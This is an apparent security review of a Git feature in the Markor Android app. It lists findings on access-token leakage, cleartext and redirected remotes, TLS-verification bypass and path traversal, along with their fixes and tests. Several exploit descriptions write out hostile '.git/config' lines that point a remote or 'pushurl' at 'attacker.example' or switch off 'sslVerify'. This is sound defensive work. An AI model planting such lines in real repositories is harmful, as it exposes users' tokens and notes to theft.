# Git tab — security review (roadmap task 7.5)

Reviewed 2026-09-14 on branch `lane/git-security-review`, cut from `feature/git-tab` at `73df5eda`.
Scope: everything under `app/src/main/java/net/gsantner/markor/git/`, the `MainActivity` tab wiring,
the manifest entries, the R8 keep rules and the dependency additions in `app/build.gradle` —
compared against upstream with `git diff origin/master...HEAD`.

## Threat model

Three properties of this feature decide how the findings below are rated.

1. **Repositories live on shared external storage.** The notebook folder is under
   `/storage/emulated/0`, and Markor holds `MANAGE_EXTERNAL_STORAGE`. Every other app with storage
   permission can therefore read and write a repository's `.git/config` and its working tree. So
   `.git/config` is *untrusted input*, not app state, and anything the app reads back out of it —
   the remote URL, `http.sslVerify` — has to be re-checked at the point of use, not only where the
   user typed it.
2. **`android:usesCleartextTraffic="true"` is set app-wide** (pre-existing, upstream). The platform
   will not stop a plaintext connection on the app's behalf.
3. **The access token is the asset.** A GitHub/GitLab PAT with `repo` scope is account-level write
   access to everything the user can push to.

## Findings

| # | Severity | What | Where | Outcome |
|---|----------|------|-------|---------|
| 1 | **High** | A remote URL with the token as its *user name* (`https://<token>@host/x`) was accepted and written to `.git/config` | `ui/GitRemoteUrlValidator.java:167`, `JGitRepos.java:223` | **Fixed** — `3dc78e95` |
| 2 | **High** | `sanitizeUrl` left `https://:token@host/x` untouched, so that token reached the UI, the error messages and the registry JSON | `JGitRepos.java:204` | **Fixed** — `3dc78e95` |
| 3 | **High** | fetch / pull / push never re-checked the remote URL from `.git/config`, so an `http://` remote received the stored token in clear text | `JGitRemoteOps.java:112,190,300` | **Fixed** — `3dc78e95` |
| 4 | **Medium** | `http.sslVerify = false` in a repository's config disabled TLS certificate checking for that repository | `JGitRemoteOps.java` (absent) | **Fixed** — `3dc78e95` |
| 5 | **Medium** | Repository-supplied paths were turned into `File`s without a containment check; the worst reached a recursive delete | `JGitRemoteOps.java:431,500`, `JGitLocalOps.java:401`, `GitConflictMarkers.java:111`, `ui/GitFragment.java:1634`, `ui/CommitDetailActivity.java:308,346` | **Fixed** — `5ecaa97b` |
| 6 | **Medium** | `remote.<name>.pushurl` decides where a push goes, but the header and the push-confirmation dialog show `remote.<name>.url` | `JGitRemoteOps.java:300`, `JGitRepos.java:132`, `ui/GitFragment.java:1428` | **Fixed** — `e84c4f8f` |
| 7 | Low | `http.cookieFile` + `http.saveCookies` make the app write a file at a path chosen in `.git/config` | `JGitRemoteOps.java` (absent) | **Fixed** — `12e26baf` |
| 8 | Low | A removed repository's worker thread and its running operation were never stopped | `ui/GitFragment.java:900` | **Fixed** — `e1721430` |
| 9 | **High** | The finding-4 guard read only the bare `http.sslVerify`; the per-URL `[http "<url>"]` subsection overrides it | `JGitRemoteOps.java` | **Fixed** — `80e579ea` |
| 10 | **Medium** | A path finding 5 rejected fell into the `git rm` branch, so the containment check itself deleted files | `JGitLocalOps.java:402`, `JGitRemoteOps.java:517` | **Fixed** — `80e579ea` |
| 11 | **Medium** | `resolveInside` trimmed the path, so `"draft .md"` resolved to `"draft.md"` | `GitPaths.java:74` | **Fixed** — `80e579ea` |
| 12 | Low | Commits ran `.git/hooks`, which sits beside the `.git/config` the threat model distrusts | `JGitLocalOps.java:427`, `JGitRemoteOps.java` | **Fixed** — `80e579ea` |
| 13 | Low | Wrong refusal message for SSH remotes and for `https://:token@host/x` | `GitRemoteUrlPolicy.java` | **Fixed** — `80e579ea` |
| 14 | — | `JGitCredentials` handed the token out for any scheme; only the layer above stopped it | `JGitCredentials.java:59` | **Hardened** — `dfdc0f82` |
| 15 | Low | Finding 8 released a worker thread only when the user removed the repository | `GitTaskRunner.java:332` | **Fixed** — `dfdc0f82` |

Findings 9–13 are against the fixes for findings 1–8, from the `/code-review high` pass. Three of
them are defects those fixes introduced; 9 and 10 were the important ones and are written up below.

Verified as sound, no change needed: see [Checked and left alone](#checked-and-left-alone).

---

### 1 — High — the token as the URL's user name reached `.git/config`

`ui/GitRemoteUrlValidator.java:167` (`hasUserinfoPassword`), `JGitRepos.java:223` (`hasPassword`).

Both credential checks were built on `URIish`, and `URIish` only recognises userinfo in the
`user:password@host` spelling. Probed directly (`new URIish(u)` on JGit 5.13.5):

| input | `getHost()` | `getUser()` | `getPass()` |
|-------|-------------|-------------|-------------|
| `https://user:TOKEN@github.com/me/n.git` | `github.com` | `user` | `TOKEN` |
| `https://TOKEN@github.com/me/n.git` | `github.com` | `TOKEN` | `null` |
| `https://:TOKEN@github.com/me/n.git` | **`null`** | `null` | `null` |

The middle row is the form GitHub's own "clone with a personal access token" instructions produce,
and it is what most tutorials tell people to paste. The validator's rule was "a colon inside the
userinfo means a password", so it let that row through; `GitRemoteUrlValidator.validate` returned
`NONE`, `RemoteSetupDialog.save` then called `setRemoteUrl`, and JGit wrote the URL — token and all —
into `.git/config`, in plain text, in the notebook folder that every app with storage permission can
read. `GitRepoConfig.setRemoteUrl` also copied it into the app's own repository-list JSON.

**Exploit.** A user follows GitHub's instructions and pastes
`https://ghp_xxxxxxxx@github.com/me/notes.git` into *Clone repository*. Any other installed app with
storage permission reads `/storage/emulated/0/Documents/notes/.git/config` and has an account-scoped
token.

**Fix.** `JGitRepos.hasPassword` is replaced by `hasUserinfo`, which refuses *any* userinfo; the
validator refuses any `@` in the authority (`hasUserinfo`, same name, `GitRemoteUrlValidator.java`).
The string `git_error__url_password` now says to remove the user name *and* the token.

### 2 — High — `sanitizeUrl` could not strip `https://:token@host/x`

`JGitRepos.java:204`.

`sanitizeUrl` is the app's single redaction point: `JGitErrors.map` runs every JGit exception message
through it, `JGitRepos.describe` runs the configured remote URL through it before it becomes
`GitRepoInfo.getRemoteUrl()`, and `GitFragment.applySnapshot` copies that value into the registry.
It was implemented with `URIish`, so for `https://:TOKEN@github.com/x` — where URIish reports no
user, no password and no host — it returned the string unchanged. The regex fallback only ran in the
`URISyntaxException` branch, which that input does not take.

**Exploit.** A repository cloned on a desktop with `git clone https://:ghp_xxx@github.com/me/notes`
and copied to the phone (or written by another app) shows the token in the Git tab's header, has it
written into the app's SharedPreferences repository list, and repeats it in every network error
message.

**Fix.** The regex runs first and `URIish` only afterwards, for the scp-like `user@host:path` form
that has no `://`. The pattern is anchored and forbids `/` in the userinfo, so an `@` in a path or a
file name is not touched.

### 3 — High — a plaintext remote in `.git/config` received the stored token

`JGitRemoteOps.java` `fetch`, `pull`, `push`.

`GitRemoteUrlValidator` enforces https, but it only sees what the user types in the two dialogs. The
URL a fetch, pull or push actually connects to is read by JGit out of `.git/config`, and nothing
between the config file and the socket checked it again. `GitCredentialStore` keys the token by host
only — scheme and port are not part of the key — so `http://github.com/me/notes.git` matches the
token stored for `github.com`. With `usesCleartextTraffic="true"`, the connection is made and JGit
sends the token in an `Authorization: Basic` header over an unencrypted socket.

**Exploit.** Any app with storage permission (or a desktop-cloned repository, or a sync app) rewrites
`[remote "origin"] url = http://attacker.example/notes.git`. Nothing in the UI changes — the header
shows the remote URL, but a user is not going to police the scheme. The next "fetch when the tab
opens", which is **on by default**, hands the token to the attacker's server.

**Fix.** New `GitRemoteUrlPolicy.refusalFor(url)` is asked before every remote operation, against the
URL that is about to be used:

* `https` — allowed; the only scheme that may carry credentials.
* no host (`file:///…` or a plain path) — allowed. Nothing leaves the device and
  `GitCredentialStore.hostKey` returns `null` for these, so no stored token can match them. The JVM
  tests fetch and push against `file://` bare remotes.
* anything else — refused by name, with a sentence that never repeats the URL.

`clone`, `setRemoteUrl` and `lsRemote` go through it in `parseUrl`; `fetch`, `pull` and `push` go
through `remoteRefusal`, which reads the remote's fetch *and* push URIs out of `RemoteConfig`.

### 4 — Medium — `http.sslVerify = false` disabled certificate checking

`JGitRemoteOps.java`, previously absent.

JGit's `TransportHttp` reads `http.sslVerify` from the repository configuration (field `sslVerify`,
`HttpConfig`). Set to `false` in a `.git/config` the app does not own, every certificate is accepted
and https gives no protection to the token. Same writer as finding 3, same reachability.

**Fix.** `remoteRefusal` refuses the operation when
`repo.getConfig().getBoolean("http", "sslVerify", true)` is false, and says which line to remove.

### 5 — Medium — repository-supplied paths were not kept inside the working folder

`JGitRemoteOps.java:431` and `:500`, `JGitLocalOps.java:401`, `GitConflictMarkers.java:111`,
`ui/GitFragment.java:1634`, `ui/CommitDetailActivity.java:308` and `:346`.

Six places did `new File(root, path)` where `path` came out of the repository — a `status` entry, a
tree walk, a diff — and then opened, wrote or deleted the result. Nothing in git's object format
forbids a tree entry named `..`; `CanonicalTreeParser` does not validate names, so a crafted pack
produces such a path, and the repositories this app opens are writable by other apps anyway. The
worst of the six was `JGitRemoteOps.abortMerge`, which passes its result to a **recursive** delete
(`FileUtils.delete(…, RECURSIVE | IGNORE_ERRORS)`).

**Fix.** New `GitPaths.resolveInside(root, path)` canonicalizes both sides and returns `null` for an
empty, absolute or escaping path; all six call sites go through it. Canonicalizing *both* sides
matters on Android, where `/sdcard` is a symlink to `/storage/emulated/0`: comparing a canonical
child against a non-canonical root would refuse every legitimate path. `GitPaths` becomes public for
the two `.ui` callers; `normalize()` stays package-private and keeps using `getAbsolutePath`, which
is deliberate — only `resolveInside` needs `..` resolved.

### 6 — Medium — a push could go somewhere the user was never shown

`JGitRemoteOps.java` `push`, `JGitRepos.java:132`, `ui/GitFragment.java:1428`.

JGit's `PushCommand` resolves its destination through `Transport.openAll`, which returns
`RemoteConfig.getPushURIs()` when that list is non-empty and falls back to `getURIs()` only
otherwise. The app never reads `remote.<name>.pushurl`: `JGitRepos.describe` reads only
`CONFIG_KEY_URL`, so `GitRepoInfo.getRemoteUrl()` — and with it the tab header, the registry entry
and, the point, the *Confirm before push* dialog added by task 7.1 — all name the **fetch** URL.

Finding 3's scheme policy already covered the cleartext variant, because `remoteRefusal` inspected
the push URIs too. It did not cover a `pushurl` pointing at a different **https** host: that passes
the policy and receives no token (credentials are host-keyed), but it still receives the repository's
contents, while the dialog the user just accepted named a different address.

**Exploit.** An app with storage permission adds one line under `[remote "origin"]`:
`pushurl = https://attacker.example/notes.git`. Nothing in the UI changes. Every future push sends
the user's notes to the attacker, and the confirmation dialog says they are going to GitHub.

**Fix.** `remoteRefusal` takes a `forPush` flag and checks exactly the URIs the operation will use —
`pushurl` for a push, `url` for fetch and pull. A push whose `pushurl` differs from the fetch URL is
refused with a sentence naming the key. The flag matters: without it a fetch was refused too, which
is wrong, since a fetch never contacts `pushurl`.

### 7 — Low — `http.cookieFile` made the app write a file at an attacker-chosen path

`JGitRemoteOps.java`, previously absent.

Disassembling `HttpConfig` from the shipped jar, JGit 5.13 reads `http.` `cookieFile`,
`cookieFileCacheLimit`, `saveCookies`, `extraHeader`, `followRedirects`, `maxRedirects`, `sslVerify`,
`postBuffer` and `userAgent` from the repository configuration. Of those, `cookieFile` +
`saveCookies` is the pair that crosses a privilege boundary: the path is absolute and JGit writes the
Netscape-format file back **as this app**, so whoever edits `.git/config` on shared storage can make
Markor write into `/data/data/net.gsantner.markor/`, which they cannot reach themselves.

**Fix.** Both keys are refused when present; the app sets neither, so their presence means someone
else did.

`extraHeader` and `followRedirects`/`maxRedirects` were assessed and **accepted**: the first only
adds headers to requests going to the user's own remote, and the second cannot leak the token, given
the redirect analysis under [Checked and left alone](#checked-and-left-alone).

### 8 — Low — a removed repository kept its worker thread and its running operation

`ui/GitFragment.java:900`.

`GitTaskRunner.shutdownRepo` is documented as "call it when a repository is removed from the
registry", and nothing called it. An operation still running against the folder the user just forgot
carried on — a pull would keep writing into a working tree the app no longer claims to manage — and
each repository's single-thread executor was held for the life of the process, `GitTaskRunner` being
a process-wide singleton.

**Fix.** `removeRepository` calls `shutdownRepo`, which cancels and releases the lane.

### 9 — High — the TLS guard was bypassable by a per-URL config subsection

`JGitRemoteOps.java`, introduced by the fix for finding 4.

The guard read `config.getBoolean("http", "sslVerify", true)` — the bare key only. Disassembling
`HttpConfig.init(Config, URIish)` from the shipped jar shows it reads the bare value first and then
**overwrites** it from the `[http "<url>"]` subsection whose URL matches the remote:
`getSubsections("http")` → `findMatch(Set, URIish)` → the four-argument
`getBoolean(section, subsection, name, default)`. So

```
[http "https://github.com/"]
    sslVerify = false
```

disabled certificate verification for exactly the remote being contacted while the guard saw nothing
— the attack the guard was written to stop, with one extra line in the same file.

**Fix.** `httpSectionRefusal` walks the bare key *and* every `http` subsection, for `sslVerify` and
for the cookie keys of finding 7 alike. Every subsection is inspected rather than only the matching
one: the match is JGit's own longest-prefix rule over a URL the app has just decided not to trust,
and refusing one key too many costs nothing, since the app writes no `http.*` key at all.

### 10 — Medium — the containment check routed rejected paths into `git rm`

`JGitLocalOps.java:402`, `JGitRemoteOps.java:517`, introduced by the fix for finding 5.

Both staging sites read `(file != null && file.exists() ? existing : removed).add(path)`, so a path
`resolveInside` **rejected** landed in `removed` — the branch that calls `git rm`, which is not
`setCached(true)` and therefore deletes the working-tree file. The check meant to make traversal
harmless made it destructive instead, and it also caught a legitimate case: a tracked symlink
pointing outside the working folder canonicalizes outside, so the next commit would have deleted it.

**Fix.** A rejected path is skipped entirely at both sites, and `resolveInside`'s javadoc now says
that a `null` is not a licence to fall through to a destructive branch.

Finding 11 compounded this one: because `resolveInside` trimmed the path, a file literally named
`draft .md` resolved to `draft.md`; that file usually does not exist, so the entry went to `removed`
and `git rm "draft .md"` deleted the real one. The path is now used verbatim — only empty and
absolute are refused.

### 14 — the second lock: the token goes to https and nothing else

`JGitCredentials.java:59`.

Not a live vulnerability — findings 3 and 6 mean no non-https URL reaches a transport — but the class
that actually hands the secret over had no opinion of its own about where it was going. It now
returns `false` for any URI whose scheme is not `https`, before asking the source for anything, so a
future code path that skips `GitRemoteUrlPolicy` still cannot put the token on the wire in the clear.

JGit's "trust this certificate anyway" prompt arrives on an *https* URI, so it still reaches
`get()` and still throws `UnsupportedCredentialItem` — the fail-closed behaviour described under
[Checked and left alone](#checked-and-left-alone) is unchanged.

### 15 — Low — idle worker threads were held for the life of the process

`GitTaskRunner.java:332`.

The general form of finding 8. A lane is created for every repository, clone target and initialized
folder the app ever touches, and only an explicit removal shut one down, so
`Executors.newSingleThreadExecutor` pinned one thread per path for the life of the process. The lane
executor is now a `ThreadPoolExecutor` with one thread and a 30-second keep-alive and
`allowCoreThreadTimeOut(true)`; serial ordering is unchanged (one thread, unbounded queue).

---

## How much finding 2 was worth

`GitFragment.applySnapshot` copies `_info.getRemoteUrl()` into `GitRepoConfig` and
`GitRepoRegistry.update()` persists it as plaintext JSON in the default `SharedPreferences` — which
Markor's Settings ▸ *Backup* exports to a user-chosen file, typically in the notebook folder on
shared storage. So before finding 2 was fixed, a token hidden in a `:token@` remote URL did not merely
appear on screen: it was copied into the app's preferences and would have been written into any
settings backup the user made.

---

## Checked and left alone

**Redirects — sound.** Disassembled `TransportHttp` from the exact dependency jar
(`org.eclipse.jgit-5.13.5.202508271544-r.jar`). `isValidRedirect` requires the new scheme to equal
the old one or to be `https`, so an https → http downgrade is refused; the location must contain the
service path; `http.maxRedirects` caps the chain. `redirect()` sets
`authMethod = HttpAuthMethod.Type.NONE.method(null)` whenever the redirect changes host, so
credentials are not replayed — JGit re-challenges and calls the `CredentialsProvider` with the *new*
URI, where our host-keyed `JGitCredentials` declines to hand over a token for a different host.

**TLS — system trust store only.** No `TrustManager`, `SSLContext`, `HostnameVerifier` or
`setSSLSocketFactory` anywhere in the feature (grep over `net/gsantner/markor/git/`, and over the
release dex for `Lnet/gsantner/…TrustManager…`). JGit's own interactive "trust this certificate
anyway" flow asks the `CredentialsProvider` for a `CredentialItem.YesNoType` and an
`InformationalMessage`; `JGitCredentials.supports` returns `false` for both and `get` throws
`UnsupportedCredentialItem`, so the app fails closed and cannot be talked into trusting a bad
certificate.

**Credential scoping — sound.** `GitCredentialStore` keys by lower-case host; `JGitCredentials` is
constructed per call, holds no secret, copies the token into JGit's `CredentialItem.Password` and
zeroes its own copy in a `finally`. `GitFixedCredentials` (the just-typed token, used by *Test
connection* and *Clone*) is scoped to the URL's host and wiped in the task's `finally`, not in the
callback, so a rotation cannot leave it in memory.

**Saved instance state — already handled.** Both token fields carry
`android:saveEnabled="false"` and `android:importantForAutofill="no"`
(`git_remote_setup_dialog.xml:70`, `git_clone_dialog.xml:98`). Without that, `TextView` would write
the typed token into the view-hierarchy `Bundle`, which the system may persist across process death.
`CloneDialog.startClone` also clears the field after handing the token over.

**Token in intent extras / instance state — none.** `DiffViewerActivity` and `CommitDetailActivity`
carry only a repo root, a sha, a path and commit metadata; `CommitDialog` carries a repo path and
the checked paths. No dialog puts a token anywhere but the Keystore.

**Logging.** No `Log.*` of a token or a URL. `GitTaskResult.toString` prints the state and the
exception *class* only. Two `Log.w(tag, msg, result.getError())` calls remain
(`DiffViewerActivity.java:173`, `CommitDetailActivity.java:245`); both sit on purely local code paths
(loading a diff, loading a commit) that never see a remote URL, so the raw throwable is kept for its
debugging value. **Accepted.**

**Exported components.** The two new activities declare no intent filter, so they are not exported;
neither takes anything from an untrusted caller.

**Release build / R8.** `assembleFlavorDefaultRelease` is green. Verified in the shrunk APK with
`dexdump`: `org.eclipse.jgit.transport.TransportHttp` and its inner classes are present,
`org/eclipse/jgit/internal/JGitText.properties` ships, and `JGitText`'s fields keep their real names
(the `TranslationBundle` keep rule holds). No `net.gsantner.markor.git.spike` or `…git.test` class is
in the flavorDefault release APK — task 7.2b moved those into `flavorAtest`, and that holds.

**Privacy.** No telemetry, no analytics, no `HttpURLConnection`/`OkHttp`/`WebView` in the feature.
The only network use is JGit against the configured remote. `ACCESS_NETWORK_STATE` is read-only and
used solely by `GitFragment.isOnline` to skip fetch-on-open when offline.

---

## Not fixed here

**`android:usesCleartextTraffic="true"` is still set app-wide** (`AndroidManifest.xml:58`,
pre-existing upstream). Tightening it, or adding a `networkSecurityConfig` that permits cleartext
only where Markor already needs it, would affect the markdown preview's `http://` images and other
upstream behaviour — outside this lane's scope and not a change to make without the fork owner.
Finding 3's fix closes the git-specific hole regardless: the token cannot reach a cleartext
connection even while the manifest permits one. **Deferred — worth a Phase 8 item.**

**No migration for a repository already configured with `https://<token>@host/…`.** That spelling was
valid before finding 1 was fixed, so an existing repository can have one. Every fetch, pull and push
on it is now refused, and the refusal names where to fix it (Git tab ▸ ⋮ ▸ *Remote…*) — but nothing
rewrites the URL or moves the token into the Keystore for the user, and the token is already sitting
in `.git/config` in cleartext. A one-time detect-and-offer-to-fix flow is a feature rather than a
review fix. **Deferred — worth a Phase 8 item.**

A tempting alternative was considered and **rejected**: accept the URL, strip the userinfo, and move
it into the username field. For the spelling this actually matters for —
`https://<token>@github.com/…` — the userinfo *is* the token, and the username field is stored
unencrypted in the `git_credentials` `SharedPreferences`. That would move the token from one
cleartext file to another rather than into the Keystore. Refusing is the safer call.

**Credentials are keyed by host, not by host + port.** A token stored for `github.com` would be sent
to `https://github.com:8443/…`. Both are https and both are the same host, so this is a
defense-in-depth gap rather than a leak; git itself scopes credentials the same way by default.
**Accepted.**

---

## Commands run

```bash
git fetch origin && git rebase origin/feature/git-tab

# unit tests, after every change
./gradlew --console=plain testFlavorDefaultDebugUnitTest --tests 'net.gsantner.markor.git.*'
./gradlew --console=plain testFlavorDefaultDebugUnitTest        # whole suite

# minified release build
./gradlew --console=plain assembleFlavorDefaultRelease

# what survived R8 in the release APK
unzip -o -q app/build/outputs/apk/flavorDefault/release/*.apk -d /tmp/apk 'classes*.dex'
$ANDROID_HOME/build-tools/35.0.0/dexdump /tmp/apk/*.dex | grep -E 'TransportHttp|JGitText|markor/git'
unzip -l app/build/outputs/apk/flavorDefault/release/*.apk | grep JGitText.properties

# JGit's own redirect and TLS handling, from the exact dependency jar
unzip -o -q ~/.gradle/caches/modules-2/files-2.1/org.eclipse.jgit/org.eclipse.jgit/\
5.13.5.202508271544-r/*/org.eclipse.jgit-5.13.5.202508271544-r.jar -d /tmp/jgit \
  'org/eclipse/jgit/transport/TransportHttp*'
javap -p -c /tmp/jgit/org/eclipse/jgit/transport/TransportHttp.class   # isValidRedirect, redirect()

# grep sweeps over the feature
grep -rn 'TrustManager|HostnameVerifier|SSLContext|sslVerify' app/src/main/java/net/gsantner/markor/git/
grep -rn 'Log\.|printStackTrace|Toast|getMessage()' app/src/main/java/net/gsantner/markor/git/
grep -rn 'new File(' app/src/main/java/net/gsantner/markor/git/
```

Reviews run over `git diff origin/master...HEAD`: `/security-review` and `/code-review high`. The
security pass independently confirmed finding 4 and contributed findings 6 and 7; the code-review
pass, run over the first three fix commits, contributed findings 9–13.

## Tests added

* `app/src/test/java/net/gsantner/markor/git/GitRemoteUrlSecurityTest.java` — the three userinfo
  spellings through `sanitizeUrl`, `hasUserinfo` and the validator; the scheme policy; a refusal
  message that does not repeat the token.
* `app/src/test/java/net/gsantner/markor/git/GitPathsTest.java` — traversal shapes through
  `resolveInside`, plus `GitConflictMarkers.scan` end to end against a file outside the working
  folder.
* `app/src/test/java/net/gsantner/markor/git/JGitRemoteConfigSecurityTest.java` — `.git/config` as
  untrusted input against a real repository: a remote rewritten to `http://` or `ftp://`, a token in
  the remote URL, `http.sslVerify = false` bare **and** in a per-URL subsection, `http.cookieFile`
  and `http.saveCookies`, and the three `pushurl` cases. Nothing in it reaches the network — each
  case must be refused before a connection is attempted, so the refusal is asserted on the message.
* `GitRemoteUrlValidatorTest.acceptsUsernameInUrlWithoutPassword` asserted finding 1's behaviour and
  is replaced by `refusesAnyUserinfoInTheUrl`; `JGitServiceContractTest` follows `hasPassword` →
  `hasUserinfo`.
